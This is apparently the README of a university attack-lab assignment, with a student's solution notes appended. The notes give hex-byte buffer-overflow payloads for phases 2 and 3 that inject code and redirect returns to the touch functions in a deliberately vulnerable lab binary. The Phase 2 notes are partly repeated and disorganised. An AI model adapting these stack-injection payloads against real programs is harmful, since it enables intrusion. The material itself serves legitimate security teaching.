This file contains materials for one instance of the attacklab.

Files:

    ctarget

Linux binary with code-injection vulnerability.  To be used for phases
1-3 of the assignment.

    rtarget

Linux binary with return-oriented programming vulnerability.  To be
used for phases 4-5 of the assignment.

     cookie.txt

Text file containing 4-byte signature required for this lab instance.

     farm.c

Source code for gadget farm present in this instance of rtarget.  You
can compile (use flag -Og) and disassemble it to look for gadgets.

     hex2raw

Utility program to generate byte sequences.  See documentation in lab
handout.

# note
- generate raw: `./hex2raw < ctarget.inp > raw1.inp`
- debug that raw in gdb: `r < raw1.inp`

# Solution
### Phase 1:
- filling 0x18 bytes to override the return address of stack, add a few padding

### Phase 2:

48 83 ec 08 // sub $0x8,%rsp
48 c7 44 24 00 02 17 40 00  // movq   $0x00401702,0x0(%rsp)
c3// ret
00 00 00 00 00 // padding
88 74 61 55 // address of first ins below



ret -> to next first of instruction in the stack as string
88 74 61 55 // address of first ins below

mov $50fa73aa, $rdi
bf aa 73 fa 50 // bf = set value to rdi

rsp grow down to put phase two as the old position
48 83 ec 08 // sub $0x8,%rsp

put phase address to stack
02 17 40 00
48 c7 44 24 00 02 17 40 00 
48 c7 44 24 08 20 45 60 00	movq   $0x604520,0x8(%rsp)

ret
c3

#### optimization
this phase can be shorter by override ret for stack, don't need sub rsp those stuff, google for better Solution

### Phase 3:
48 c7 c7 b0 74 61 55 // set address of string to rdi
c3 // ret
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
88 74 61 55 00 00 00 00 // first ret (first rsp), jump to above ins
d6 17 40 00 00 00 00 00 // second ret (2nd rsp), jump to touch3
35 30 66 61 37 33 61 61 // string value of cookie
00